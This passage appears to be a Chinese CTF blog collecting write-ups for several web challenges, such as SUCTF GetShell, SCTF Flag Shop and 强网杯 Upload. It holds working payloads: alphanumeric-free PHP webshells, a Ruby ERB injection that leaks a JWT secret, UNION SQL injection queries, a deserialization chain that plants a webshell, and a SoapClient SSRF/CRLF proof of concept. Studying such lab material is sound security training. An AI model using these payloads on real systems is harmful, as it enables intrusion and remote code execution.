nion&quot;;s:8:&quot;CtrlCase&quot;;O:12:&quot;UpdateHelper&quot;:1:&#123;s:3:&quot;sql&quot;;O:4:&quot;User&quot;:2:&#123;s:3:&quot;age&quot;;s:70:&quot;select 1,&quot;c4ca4238a0b923820dcc509a6f75849b&quot; from user where username&#x3D;?&quot;;s:8:&quot;nickname&quot;;O:4:&quot;Info&quot;:1:&#123;s:8:&quot;CtrlCase&quot;;O:6:&quot;dbCtrl&quot;:2:&#123;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;s:1:&quot;1&quot;;&#125;&#125;&#125;&#125;&#125; 然后用户名为admin，密码为1登录即可 [SUCTF 2018]GetShell 很明显是传个一句话上去，但是他会对文件内容从第六位开始进行黑名单检测，用bp简单fuzz一下 括号还有取反符号都没被过滤，参考一下p牛的文章 一些不包含数字和字母的webshell | 离别歌 (leavesongs.com) 方法一 在PHP中，两个字符串执行异或操作以后，得到的还是一个字符串。所以，我们想得到a-z中某个字母，就找到某两个非字母、数字的字符，他们的异或结果是这个字母即可。 方法二 和方法一有异曲同工之妙，唯一差异就是，方法一使用的是位运算里的“异或”，方法二使用的是位运算里的“取反”。 方法二利用的是UTF-8编码的某个汉字，并将其中某个字符取出来，比如&#39;和&#39;&#123;2&#125;的结果是&quot;\\x8c&quot;，其取反即为字母s： 方法三 &lt;?php $_&#x3D;[]; $_&#x3D;@&quot;$_&quot;; &#x2F;&#x2F; $_&#x3D;&#39;Array&#39;; $_&#x3D;$_[&#39;!&#39;&#x3D;&#x3D;&#39;@&#39;]; &#x2F;&#x2F; $_&#x3D;$_[0]; $___&#x3D;$_; &#x2F;&#x2F; A $__&#x3D;$_; $__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; $___.&#x3D;$__; &#x2F;&#x2F; S $___.&#x3D;$__; &#x2F;&#x2F; S $__&#x3D;$_; $__++;$__++;$__++;$__++; &#x2F;&#x2F; E $___.&#x3D;$__; $__&#x3D;$_; $__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; &#x2F;&#x2F; R $___.&#x3D;$__; $__&#x3D;$_; $__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; &#x2F;&#x2F; T $___.&#x3D;$__; $____&#x3D;&#39;_&#39;; $__&#x3D;$_; $__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; &#x2F;&#x2F; P $____.&#x3D;$__; $__&#x3D;$_; $__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; &#x2F;&#x2F; O $____.&#x3D;$__; $__&#x3D;$_; $__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; &#x2F;&#x2F; S $____.&#x3D;$__; $__&#x3D;$_; $__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; &#x2F;&#x2F; T $____.&#x3D;$__; $_&#x3D;$$____; $___($_[_]); &#x2F;&#x2F; ASSERT($_POST[_]); 这题里取反符号没被过滤，那我们就用第二种方法 可以看到我们可以利用数组的方式从汉字的取反值里读出一个字母 找篇p牛的文章跑一下 &lt;?php $dome &#x3D; &#39;当我站在山顶上俯瞰半个鼓浪屿和整个厦门的夜空的时候，我知道此次出行的目的已经完成了，我要开始收拾行李，明天早上离开这里。 前几天有人问我，大学四年结束了，你也不说点什么？乌云发生了一些事情，所有人都缄默不言，你也是一样吗？你逃到南方，难道不回家了吗？当然要回家，我只是想找到我要找的答案。其实这次出来一趟很累，晚上几乎是热汗淋漓回到住处，厦门的海风伴着妮妲路过后带来的淅淅沥沥的小雨，也去不走我身上任何一个毛孔里的热气。好在旅社的生活用品一应俱全，洗完澡后我爬到屋顶。 旅社是一个老别墅，说起来也不算老，比起隔壁一家旧中国时期的房子要豪华得多，竖立在笔山顶上与厦门岛隔海相望。站在屋顶向下看，灯火阑珊的鼓浪屿街市参杂在绿树与楼宇间，依稀还可以看到熙熙攘攘的游客。大概是夜晚渐深的缘故，周围慢慢变得宁静下来，我忘记白天在奔波什么，直到站在这里的时候，我才知道我寻找的答案并不在南方。 当然也不在北方，北京的很多东西让我非常丧气，包括自掘坟墓的中介和颐指气使的大人们；北京也有很多东西让我喜欢，我喜欢颐和园古色古香的玉澜堂，我喜欢朝阳门那块“永延帝祚”的牌坊，喜欢北京鳞次栉比的老宅子和南锣鼓巷的小吃。但这些都不是我要的答案，我也不知道我追随的是什么，但想想百年后留下的又是什么，想想就很可怕。 我曾经为了吃一碗臭豆腐，坐着优步从上地到北海北，兴冲冲地来到那个垂涎已久的豆腐摊前，用急切又害羞的口吻对老板说，来两份量的臭豆腐。其实也只要10块钱，吃完以后便是无与伦比的满足感。我记得那是毕业设计审核前夕的一个午后，五月的北京还不算炎热，和煦的阳光顺着路边老房子的屋檐洒向大地，但我还是不敢站在阳光下，春天的燥热难耐也绝不输给夏天。就像很多人冷嘲热讽的那样，做这一行谁敢把自己完全曝光，甭管你是黑帽子白帽子还是绿帽子。 生活在那个时候还算美好，我依旧是一个学生，几天前辞别的同伴还在朝九晚五的工作，一切都照旧运行，波澜不惊。 远走千里吃豆腐这种理想主义的事情这几年在我身上屡屡发生，甚至南下此行也不例外。一年前的这个时候我许过一个心愿，在南普陀，我特为此来还愿。理想化、单纯与恋旧，其中单纯可不是一个多么令人称赞的形容，很多人把他和傻挂钩。“你太单纯了，你还想着这一切会好起来”，对呀，在男欢女爱那些事情上，我可不单纯，但有些能让人变得圆滑与世故的抉择中，我宁愿想的更单纯一些。 去年冬天孤身一人来到北京，放弃了在腾讯做一个安逸的实习生的机会，原因有很多也很难说。在腾讯短暂的实习生活让我记忆犹新，我感觉这辈子不会再像一个小孩一样被所有人宠了，这些当我选择北漂的时候应该就要想到的。北京的冬天刺骨的寒冷，特别是2015年的腊月，有几天连续下着暴雪，路上的积雪一踩半步深，咯吱咯吱响，周遭却静的像深山里的古刹。我住的小区离公司有一段距离，才下雪的那天我甚至还走着回家。北京的冬天最可怕的是寒风，走到家里耳朵已经硬邦邦好像一碰就会碎，在我一头扎进被窝里的时候，我却慢慢喜欢上这个古都了。 我想到《雍正皇帝》里胤禛在北京的鹅毛大雪里放出十三爷，那个拼命十三郎带着令牌取下丰台大营的兵权，保了大清江山盛世的延续与稳固。那一夜，北京的漫天大雪绝不逊于今日，而昔人已作古，来者尚不能及，多么悲哀。 这个古都承载着太多历史的厚重感，特别是下雪的季节，我可以想到乾清宫前广场上千百年寂寞的雕龙与铜龟，屋檐上的积雪，高高在上的鸱吻，想到数百年的沧桑与朝代更迭。雪停的那天我去了颐和园，我记得我等了很久才摇摇摆摆来了一辆公交车，车上几乎没有人，司机小心翼翼地转动着方向盘，在湿滑的道路上缓慢前行。窗外白茫茫一片，阳光照在雪地上有些刺眼，我才低下头。 颐和园的学生票甚至比地铁票还便宜。在昆明湖畔眺望湖面，微微泛着夕阳霞光的湖水尚未结冰，踩着那些可能被御碾轧过的土地，滑了无数跤，最后只能扶着湖边的石狮子叹气，为什么没穿防滑的鞋子。 昆明湖这一汪清水，见证了光绪皇帝被囚禁十载的蹉跎岁月，见证了静安先生誓为先朝而自溺，也见证了共和国以来固守与开放的交叠。 说起来，家里有本卫琪著的《人间词话典评》，本想买来瞻仰一下王静安的这篇古典美学巨著，没想到全书多是以批判为主。我自诩想当文人的黑客，其实也只是嘴里说说，真到评说文章是非的时候，我却张口无词。倒是誓死不去发，这点确实让我无限感慨：中国士大夫的骨气，真的是从屈原投水的那一刻就奠定下来的。 有句话说，古往今来中国三大天才死于水，其一屈原，其二李白，其三王国维。卫琪对此话颇有不服，不纠结王国维是否能够与前二者相提并论，我单喜欢他的直白，能畅快评说古今词话的人，也许无出其右了吧。 人言可畏、人言可畏，越到现代越会深深感觉到这句话的正确，看到很多事情的发展往往被舆论所左右，就越羡慕那些无所畏惧的人，不论他们是勇敢还是自负。此间人王垠算一个，网络上人们对他毁誉参半，但确实有本事而又不矫揉做作，放胆直言心比天高的只有他一个了。 那天在昆明湖畔看过夕阳，直到天空变的无比深邃，我才慢慢往家的方向走。耳机放着后弦的《昆明湖》，不知不觉已经十年了，不知道这时候他有没有回首望望自己的九公主和安娜，是否还能够“泼墨造一匹快马，追回十年前姑娘”。 后来，感觉一切都步入正轨，学位证也顺利拿到，我匆匆告别了自己的大学。后来也遇到了很多事，事后有人找我，很多人关心你，少数人可能不是，但出了学校以后，又有多少人和事情完全没有目的呢？我也考虑了很多去处，但一直没有决断，倒有念怀旧主，也有妄自菲薄之意，我希望自己能做出点成绩再去谈其他的，所以很久都是闭门不出，琢磨东西。 来到厦门，我还了一个愿，又许了新的愿望，希望我还会再次来还愿。我又来到了上次没住够的鼓浪屿，订了一间安静的房子，只有我一个人。在这里，能听到的只有远处屋檐下鸟儿叽叽喳喳的鸣叫声，远处的喧嚣早已烟消云散，即使这只是暂时的。 站在屋顶的我，喝下杯中最后一口水。 清晨，背着行李，我乘轮渡离开了鼓浪屿，这是我第二次来鼓浪屿，谁知道会不会是最后一次。我在这里住了三天，用三天去寻找了一个答案。 不知不觉我又想到辜鸿铭与沈子培的那段对话。 “大难临头，何以为之？” “世受国恩，死生系之。”&#39;; for($i &#x3D;0 ; $i &lt; 1000 ; $i++) &#123; $sub_str &#x3D; mb_substr($dome, $i, 1); echo $sub_str.&#39;&#x3D;&#39;.~($sub_str)[1]; echo &quot;\\r\\n&quot;; &#125; 我们想构造system（这里不构造eval的原因是eval 属于PHP语法构造的一部分，并不是一个函数，所以不能通过 变量函数 的形式来调用（虽然她确实像极了函数原型）。这样的语法构造还包括：echo，print，unset()，isset()，empty()，include，require，.. 然后把我们想要的字母找出来 北&#x3D;s 冲&#x3D;y 北&#x3D;s 择&#x3D;t 的&#x3D;e 和&#x3D;m 说&#x3D;P 小&#x3D;O 笔&#x3D;S 站&#x3D;T 好了，但是1是数字，显然不能直接用，所以还要尝试利用php的特性获得1 最终payload &lt;?&#x3D;$__&#x3D;[];$___&#x3D;[];$_&#x3D;$__&#x3D;&#x3D;$___;$____&#x3D;~(北)[$_].~(冲)[$_].~(北)[$_].~(择)[$_].~(的)[$_].~(和)[$_];$_____&#x3D;_.~(说)[$_].~(小)[$_].~(笔)[$_].~(站)[$_];$____($$_____[$____]); php传上去直接给注释了，所以可以用短标签 flag在环境变量里 [SCTF2019]Flag Shop点进去之前我还以为是个条件竞争。。。 钱显然不够买flag的，点work可以增加，但是这道题显然不是为了测脚本编写水平的 网站存在jwt 解码看一下 但是这里有着我们不知道的密钥，那么下面就是想办法获取密钥把jwt里的jkl值改大，购买flag就行了 网站存在robots.txt，访问一下看到filebak路径 require &#39;sinatra&#39; require &#39;sinatra&#x2F;cookies&#39; require &#39;sinatra&#x2F;json&#39; require &#39;jwt&#39; require &#39;securerandom&#39; require &#39;erb&#39; set :public_folder, File.dirname(__FILE__) + &#39;&#x2F;static&#39; FLAGPRICE &#x3D; 1000000000000000000000000000 ENV[&quot;SECRET&quot;] &#x3D; SecureRandom.hex(64) configure do enable :logging file &#x3D; File.new(File.dirname(__FILE__) + &#39;&#x2F;..&#x2F;log&#x2F;http.log&#39;,&quot;a+&quot;) file.sync &#x3D; true use Rack::CommonLogger, file end get &quot;&#x2F;&quot; do redirect &#39;&#x2F;shop&#39;, 302 end get &quot;&#x2F;filebak&quot; do content_type :text erb IO.binread __FILE__ end get &quot;&#x2F;api&#x2F;auth&quot; do payload &#x3D; &#123; uid: SecureRandom.uuid , jkl: 20&#125; auth &#x3D; JWT.encode payload,ENV[&quot;SECRET&quot;] , &#39;HS256&#39; cookies[:auth] &#x3D; auth end get &quot;&#x2F;api&#x2F;info&quot; do islogin auth &#x3D; JWT.decode cookies[:auth],ENV[&quot;SECRET&quot;] , true, &#123; algorithm: &#39;HS256&#39; &#125; json(&#123;uid: auth[0][&quot;uid&quot;],jkl: auth[0][&quot;jkl&quot;]&#125;) end get &quot;&#x2F;shop&quot; do erb :shop end get &quot;&#x2F;work&quot; do islogin auth &#x3D; JWT.decode cookies[:auth],ENV[&quot;SECRET&quot;] , true, &#123; algorithm: &#39;HS256&#39; &#125; auth &#x3D; auth[0] unless params[:SECRET].nil? if ENV[&quot;SECRET&quot;].match(&quot;#&#123;params[:SECRET].match(&#x2F;[0-9a-z]+&#x2F;)&#125;&quot;) puts ENV[&quot;FLAG&quot;] end end if params[:do] &#x3D;&#x3D; &quot;#&#123;params[:name][0,7]&#125; is working&quot; then auth[&quot;jkl&quot;] &#x3D; auth[&quot;jkl&quot;].to_i + SecureRandom.random_number(10) auth &#x3D; JWT.encode auth,ENV[&quot;SECRET&quot;] , &#39;HS256&#39; cookies[:auth] &#x3D; auth ERB::new(&quot;&lt;script&gt;alert(&#39;#&#123;params[:name][0,7]&#125; working successfully!&#39;)&lt;&#x2F;script&gt;&quot;).result end end post &quot;&#x2F;shop&quot; do islogin auth &#x3D; JWT.decode cookies[:auth],ENV[&quot;SECRET&quot;] , true, &#123; algorithm: &#39;HS256&#39; &#125; if auth[0][&quot;jkl&quot;] &lt; FLAGPRICE then json(&#123;title: &quot;error&quot;,message: &quot;no enough jkl&quot;&#125;) else auth &lt;&lt; &#123;flag: ENV[&quot;FLAG&quot;]&#125; auth &#x3D; JWT.encode auth,ENV[&quot;SECRET&quot;] , &#39;HS256&#39; cookies[:auth] &#x3D; auth json(&#123;title: &quot;success&quot;,message: &quot;jkl is good thing&quot;&#125;) end end def islogin if cookies[:auth].nil? then redirect to(&#39;&#x2F;shop&#39;) end end 这里是个ruby的模板注入漏洞 【技术分享】手把手教你如何完成Ruby ERB模板注入 - 安全客，安全资讯平台 (anquanke.com) 主要是看work路由这块 ruby没学过，也没安环境，有的地方就直接截别的师傅的博客了 先看下边这段 这段大概意思就是要我们输入的do的参数和#&#123;params[:name][0,7]&#125; is working这块进行一个比较，如果相等就会执行&lt;script&gt;alert(&#39;#&#123;params[:name][0,7]&#125; working successfully!&#39;)&lt;/script&gt;这段，而#&#123;params[:name][0,7]&#125;这里我们是可以控制的，也就是所谓的ruby的Erb模板注入，注入语句的格式是&lt;%=%&gt;至少是五个字符，但是之前的参数的比较只比较name参数的前七位，所以我们实际能控制的也就只有两个字符 我们可以先试试让它输出1，特殊字符记得要先url编个码 再看上边这段，他会将我们以secret为键的参数与环境变量里的secret进行比较，然后输出境变量里的secret 这里需要用到Ruby语言的一个特性。ruby的全局变量 (3条消息) Ruby全局变量汇总_zdq0394的博客-CSDN博客 我们可以利用其中的$&#39;来返回正则匹配结果的右边 所以我们如果把传入的secret值为空，那么默认环境变量里的secret全在匹配结果的右边，也就能读出我们的密钥 &#x2F;work?name&#x3D;&lt;%25&#x3D;$%27%25&gt;&amp;do&#x3D;&lt;%25&#x3D;$%27%25&gt;%20is%20working&amp;SECRET&#x3D; 拿到密钥直接改jwt就行了 买了flag之后再对jwt解个码就能拿到flag了 [b01lers2020]Life on Mars进入题目之后点击网页的几个按钮连个跳转都没有，遇事不决抓个包看看 看到有个search参数，这里存在sql注入 先用order by探一下列数，然后直接联合注入 注表名： 但是这里并没有什么可以的表，猜测是不是有其他库，重新去看一下库名 这里用database()只能看到一个aliens库，因为database()只能看到当前库，下次记得一定要把所有库都查出来 用union+select+1,group_concat(schema_name)+from+information_schema.schemata这个语句可以注出另外两个库,不知道为什么 看一下alien_code库 search&#x3D;amazonis_planitia+union+select+1,group_concat(table_name)+from+information_schema.tables+where+table_schema&#x3D;&#39;alien_code&#39; 再看看code表 search&#x3D;amazonis_planitia+union+select+1,group_concat(column_name)+from+information_schema.columns+where+table_name&#x3D;&#39;code&#39; 爆字段 search&#x3D;amazonis_planitia+union+select+1,group_concat(id,code)+from+alien_code.code [GKCTF 2021]easycms提示是后台五位弱密码 所以猜admin/admin或者是admin/12345 进入后直接访问admin.php然后admin/12345登录 这题解法有两种 第一种 设计-主题里可以进行自定义设置，而类型可以选php源代码，也就可以直接写入命令来执行 但是当你写入时会显示 这是因为在安全这里设置了文件验证 但是要取消文件验证也要有这个文件 这时候就要利用这个文件上传功能 传个文件可以看到存储路径 那如果我们重命名这个文件能不能实现目录穿越，让它上传到我们想要的目录下呢 结果是可以的 然后我们就可以去掉文件验证，然后利用cat /flag查看flag了 方法二 在导出主题的时候，我们可以看一下下载链接 http:&#x2F;&#x2F;511d2b5b-5b1e-4369-bccf-8bce11b0cea1.node4.buuoj.cn:81&#x2F;admin.php?m&#x3D;ui&amp;f&#x3D;downloadtheme&amp;theme&#x3D;L3Zhci93d3cvaHRtbC9zeXN0ZW0vdG1wL3RoZW1lL2RlZmF1bHQvMTIzLnppcA&#x3D;&#x3D; 对后边这段base64解码可以看出 这里是文件的路径，那我们可以把这个修改成/flag来直接下载flag（猜flag的文件名感觉太看运气了 这道题感觉难度不高，但更像真实环境，所以更需要思路和经验 [强网杯 2019]Upload打着文件上传名字的反序列化题 进入后先注册，登录能看到一个文件上传的页面，传个图片上去，发现能看见路径，那很显然要传个马上去连一下。 这时候我们发现cookie里有一段像base64的编码，解密一下发现是序列化的内容 一般序列化应该都会给源码，所以找一下目录，有www.tar.gz 主要是这几个文件 用phpstorm打开之后能发现index.php和register.php里被打了两个断点 register.php index.php 算是出题人给的提示吧，register那里是我们要利用的序列化的入口，registed和checker参数可控，让checker实例化proflie类就能调用profile里的魔术方法，实现我们后面的反序列化，而index那里能够对序列化内容进行反序列化，实现漏洞利用的目的。 我们再来看看profile.php &lt;?php namespace app\\web\\controller; use think\\Controller; class Profile extends Controller &#123; public $checker; public $filename_tmp; public $filename; public $upload_menu; public $ext; public $img; public $except; public function __construct() &#123; $this-&gt;checker&#x3D;new Index(); $this-&gt;upload_menu&#x3D;md5($_SERVER[&#39;REMOTE_ADDR&#39;]); @chdir(&quot;..&#x2F;public&#x2F;upload&quot;); if(!is_dir($this-&gt;upload_menu))&#123; @mkdir($this-&gt;upload_menu); &#125; @chdir($this-&gt;upload_menu); &#125; public function upload_img()&#123; if($this-&gt;checker)&#123; if(!$this-&gt;checker-&gt;login_check())&#123; $curr_url&#x3D;&quot;http:&#x2F;&#x2F;&quot;.$_SERVER[&#39;HTTP_HOST&#39;].$_SERVER[&#39;SCRIPT_NAME&#39;].&quot;&#x2F;index&quot;; $this-&gt;redirect($curr_url,302); exit(); &#125; &#125; if(!empty($_FILES))&#123; $this-&gt;filename_tmp&#x3D;$_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;]; $this-&gt;filename&#x3D;md5($_FILES[&#39;upload_file&#39;][&#39;name&#39;]).&quot;.png&quot;; $this-&gt;ext_check(); &#125; if($this-&gt;ext) &#123; if(getimagesize($this-&gt;filename_tmp)) &#123; @copy($this-&gt;filename_tmp, $this-&gt;filename); @unlink($this-&gt;filename_tmp); $this-&gt;img&#x3D;&quot;..&#x2F;upload&#x2F;$this-&gt;upload_menu&#x2F;$this-&gt;filename&quot;; $this-&gt;update_img(); &#125;else&#123; $this-&gt;error(&#39;Forbidden type!&#39;, url(&#39;..&#x2F;index&#39;)); &#125; &#125;else&#123; $this-&gt;error(&#39;Unknow file type!&#39;, url(&#39;..&#x2F;index&#39;)); &#125; &#125; public function update_img()&#123; $user_info&#x3D;db(&#39;user&#39;)-&gt;where(&quot;ID&quot;,$this-&gt;checker-&gt;profile[&#39;ID&#39;])-&gt;find(); if(empty($user_info[&#39;img&#39;]) &amp;&amp; $this-&gt;img)&#123; if(db(&#39;user&#39;)-&gt;where(&#39;ID&#39;,$user_info[&#39;ID&#39;])-&gt;data([&quot;img&quot;&#x3D;&gt;addslashes($this-&gt;img)])-&gt;update())&#123; $this-&gt;update_cookie(); $this-&gt;success(&#39;Upload img successful!&#39;, url(&#39;..&#x2F;home&#39;)); &#125;else&#123; $this-&gt;error(&#39;Upload file failed!&#39;, url(&#39;..&#x2F;index&#39;)); &#125; &#125; &#125; public function update_cookie()&#123; $this-&gt;checker-&gt;profile[&#39;img&#39;]&#x3D;$this-&gt;img; cookie(&quot;user&quot;,base64_encode(serialize($this-&gt;checker-&gt;profile)),3600); &#125; public function ext_check()&#123; $ext_arr&#x3D;explode(&quot;.&quot;,$this-&gt;filename); $this-&gt;ext&#x3D;end($ext_arr); if($this-&gt;ext&#x3D;&#x3D;&quot;png&quot;)&#123; return 1; &#125;else&#123; return 0; &#125; &#125; public function __get($name) &#123; return $this-&gt;except[$name]; &#125; public function __call($name, $arguments) &#123; if($this-&gt;&#123;$name&#125;)&#123; $this-&gt;&#123;$this-&gt;&#123;$name&#125;&#125;($arguments); &#125; &#125; &#125; 这是控制文件上传的部分 这里就是控制上传文件的文件名的位置。这里有三个if为了保证我们能成功执行，我们就必须绕过前两个if然后进入第三个。也就是让checker为0，然后修改cookie时不传文件，ext=1，这样我们就能进入第三个if中 但是这里对上传的格式有个判断，所以只能传图片了 这里是要利用图片马 再看下面的copy，将filename_tmp里的内容复制到filename里 而这两个变量的值是之前赋的 $this-&gt;filename_tmp&#x3D;$_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;]; $this-&gt;filename&#x3D;md5($_FILES[&#39;upload_file&#39;][&#39;name&#39;]).&quot;.png&quot;; 就是说在我们传文件之后，他会创造一个临时文件名保存这个文件，再创建一个md5后的文件名加上.png 将这个文件的内容给到.png结尾的文件中，所以无论怎么样上传最终的文件都说.png结尾的 但是我们可以先传个文件，再利用序列化修改cookie来为这两个值重新赋值，因为我们只改了cookie没有传文件，也就不会进入第二个if判断中，再通过第三个if判断的copy函数让我们传的图片马变成php文件 既然我们找到了反序列化的起点与终点，中间的过程就可以从profile里的魔术变量下手了 读取不可访问属性的值时，__get() 会被调用； 在对象中调用一个不可访问方法时，__call() 会被调用。 __get()中的return $this-&gt;except[$name];name的值就是index(跟__call的两个参数的来源差不多），所以把except赋值成二维数组，键为index值为upload_img就行了 所以链子是__destruct()-&gt;__call()-&gt;__get()-&gt;upload_img 解题步骤 先传图片马，然后找传上去的路径加在filename_tmp和filename里 &lt;?php namespace app\\web\\controller; use think\\Controller; class Profile &#123; public $checker &#x3D; 0;&#x2F;&#x2F;绕过第一个if判断 public $filename_tmp &#x3D; &#39;.&#x2F;upload&#x2F;cc551ab005b2e60fbdc88de809b2c4b1&#x2F;799bad5a3b514f096e69bbc4a7896cd9.png&#39;; public $filename &#x3D; &#39;.&#x2F;upload&#x2F;cc551ab005b2e60fbdc88de809b2c4b1&#x2F;1.php&#39; ; public $upload_menu; public $ext &#x3D; 1;&#x2F;&#x2F;进入第三个if判断 public $img; public $except &#x3D; array(&quot;index&quot;&#x3D;&gt;&quot;upload_img&quot;); &#125; class Register &#123; public $checker; public $registed &#x3D; 0; &#125; $a &#x3D; new Register(); $a-&gt;checker &#x3D;new Profile(); var_dump(base64_encode(serialize($a))); TzoyNzoiYXBwXHdlYlxjb250cm9sbGVyXFJlZ2lzdGVyIjoyOntzOjc6ImNoZWNrZXIiO086MjY6ImFwcFx3ZWJcY29udHJvbGxlclxQcm9maWxlIjo3OntzOjc6ImNoZWNrZXIiO2k6MDtzOjEyOiJmaWxlbmFtZV90bXAiO3M6Nzg6Ii4vdXBsb2FkL2NjNTUxYWIwMDViMmU2MGZiZGM4OGRlODA5YjJjNGIxLzc5OWJhZDVhM2I1MTRmMDk2ZTY5YmJjNGE3ODk2Y2Q5LnBuZyI7czo4OiJmaWxlbmFtZSI7czo0NzoiLi91cGxvYWQvY2M1NTFhYjAwNWIyZTYwZmJkYzg4ZGU4MDliMmM0YjEvMS5waHAiO3M6MTE6InVwbG9hZF9tZW51IjtOO3M6MzoiZXh0IjtpOjE7czozOiJpbWciO047czo2OiJleGNlcHQiO2E6MTp7czo1OiJpbmRleCI7czoxMDoidXBsb2FkX2ltZyI7fX1zOjg6InJlZ2lzdGVkIjtpOjA7fQ&#x3D;&#x3D; 把cookie改掉然后刷新 会报错，但是实际已经修改成功了 蚁剑连接，在根目录下找到flag bestphp&#39;s revenge session反序列化 CRLF 变量覆盖 PHP原生类SoapClient的SSRF。 &lt;?php highlight_file(__FILE__); $b &#x3D; &#39;implode&#39;; call_user_func($_GET[&#39;f&#39;], $_POST); session_start(); if (isset($_GET[&#39;name&#39;])) &#123; $_SESSION[&#39;name&#39;] &#x3D; $_GET[&#39;name&#39;]; &#125; var_dump($_SESSION); $a &#x3D; array(reset($_SESSION), &#39;welcome_to_the_lctf2018&#39;); call_user_func($b, $a); ?&gt; 直接访问flag.php 发现要本地访问，再结合session_start函数，猜测是要利用session反序列化 session反序列化 php中的session中的内容并不是放在内存中的，而是以文件的方式来存储的，存储方式就是由配置项session.save_handler来进行确定的，默认是以文件的方式存储。存储的文件是以sess_sessionid来进行命名的，文件的内容就是session值的序列话之后的内容。 session反序列化产生的原因是由于序列化与反序列化的处理器的不同导致的，默认是php 可以用ini_set(‘session.serialize_handler’, ‘php’)来规定 如果先利用php_serialize处理器进行序列化，当我们传入的值为|O:4:“test”:0:&#123;&#125;时，序列化的结果就类似与a:1:&#123;s:1:“a”;s:16:&quot;|O:4:“test”:0:&#123;&#125;&quot;;&#125;，而如果用php处理器反序列化，会把a:1:{s:1:“a”;s:16:&quot;看作键名，将这段当作真正的序列化之后的结果来进行反序列化O:4:“test”:0:&#123;&#125;&quot; CRLF 看看p牛的文章[CRLF Injection漏洞的利用与实例分析 - phith0n (wooyun.js.org)](https://wooyun.js.org/drops/CRLF Injection漏洞的利用与实例分析.html) CRLF是”回车 + 换行”（\\r\\n）的简称。在HTTP协议中，HTTP Header与HTTP Body是用两个CRLF分隔的，浏览器就是根据这两个CRLF来取出HTTP 内容并显示出来。所以，一旦我们能够控制HTTP 消息头中的字符，注入一些恶意的换行，这样我们就能注入一些会话Cookie或者HTML代码，所以CRLF Injection又叫HTTP Response Splitting，简称HRS。 简单来说就是利用换行符在响应头里注入一些东西 SoapClient 这部分我直接贴别的师傅的博客内容了 bestphp&#39;s revenge_沐目_01的博客-CSDN博客_bestphp&#39;s revenge 从几道CTF题看SOAP安全问题 - 安全客，安全资讯平台 (anquanke.com) [LCTF]bestphp&#39;s revenge 给我的启发学习 - op_hxc - 博客园 (cnblogs.com) 因为flag.php要求本地登录，所以我们如果能用反序列化调用Soapclient来访问flag.php就能得到flag 变量覆盖 extract函数会导致变量覆盖 知识点了解之后再重新看index.php &lt;?php highlight_file(__FILE__); $b &#x3D; &#39;implode&#39;; call_user_func($_GET[&#39;f&#39;], $_POST); session_start(); if (isset($_GET[&#39;name&#39;])) &#123; $_SESSION[&#39;name&#39;] &#x3D; $_GET[&#39;name&#39;]; &#125; var_dump($_SESSION); $a &#x3D; array(reset($_SESSION), &#39;welcome_to_the_lctf2018&#39;); call_user_func($b, $a); ?&gt; 要在调用Soapclient反序列化，就要有一个不存在的方法被调用，而extract可以导致变量覆盖，那我们就利用第一个回调函数，将b赋值为call_user_func，如果传入的参数是 array 型的化，会将数组的成员当作 类名 和 方法名。此时第二个回调函数的内容为 call_user_func(call_user_func(reset($_SESSION), &#39;welcome_to_the_lctf2018&#39;)) 关于reset函数：reset() 函数将内部指针指向数组中的第一个元素，并输出。在这里就相当于$_SESSION[&#39;name&#39;] 我们只要传入name=Soapclient就能将这段语句变为 call_user_func(call_user_func(array(Soapclient,&#39;welcome_to_the_lctf2018&#39;)));因为Soapclient显然没有welcome_to_the_lctf2018这个方法，也就会调用其中的_call方法，触发反序列化 在修改序列化引擎的部分 正常的话，比如我们在入门PHP的session反序列化的时候，改变php引擎的方法是ini_set（）函数，但是这个函数不接受数组，call_user_func($_GET[&#39;f&#39;], $_POST);而这里的post超级全局变量是一个数组，所以ini_set就不行了，于是使用session_start来代替，同时呢session.serialize_handler = php_serialize也变成了serialize_handler=php_serialize。 poc &lt;?php $target &#x3D; &quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;flag.php&quot;; $attack &#x3D; new SoapClient(null,array(&#39;location&#39; &#x3D;&gt; $target, &#39;user_agent&#39; &#x3D;&gt; &quot;test\\r\\nCookie: PHPSESSID&#x3D;96sujaq7o5tl0btee8urnlsrb3\\r\\n&quot;, &#39;uri&#39; &#x3D;&gt; &quot;123&quot;)); $payload &#x3D; urlencode(serialize($attack)); echo $payload; &#x2F;&#x2F;O%3A10%3A%22SoapClient%22%3A5%3A%7Bs%3A3%3A%22uri%22%3Bs%3A3%3A%22123%22%3Bs%3A8%3A%22location%22%3Bs%3A25%3A%22http%3A%2F%2F127.0.0.1%2Fflag.php%22%3Bs%3A15%3A%22_stream_context%22%3Bi%3A0%3Bs%3A11%3A%22_user_agent%22%3Bs%3A52%3A%22test%0D%0ACookie%3A+PHPSESSID%3D96sujaq7o5tl0btee8urnlsrb3%0D%0A%22%3Bs%3A13%3A%22_soap_version%22%3Bi%3A1%3B%7D 然后我们再通过 extract来实现触发反序列化的操作 这实际上已经成功了，相当于用一个PHPSESSID=96sujaq7o5tl0btee8urnlsrb的账号访问到了flag.php，接下来我们只要将cookie改为这个就行了 再session反序列化的时候不知道为啥用自己的会有些问题，导致连接超时，但是换成另外的就不会这样，上面那个就是用自己cookie的结果，卡了好久，然后再刷新的时候环境都打不开了 这是用其他的cookie的结果 [ISITDTU 2019]EasyPHP这题第二个if判断可太恶心人了 &lt;?php highlight_file(__FILE__); $_ &#x3D; @$_GET[&#39;_&#39;]; if ( preg_match(&#39;&#x2F;[\\x00- 0-9\\&#39;&quot;&#96;$&amp;.,|[&#123;_defgops\\x7F]+&#x2F;i&#39;, $_) ) die(&#39;rosé will not do 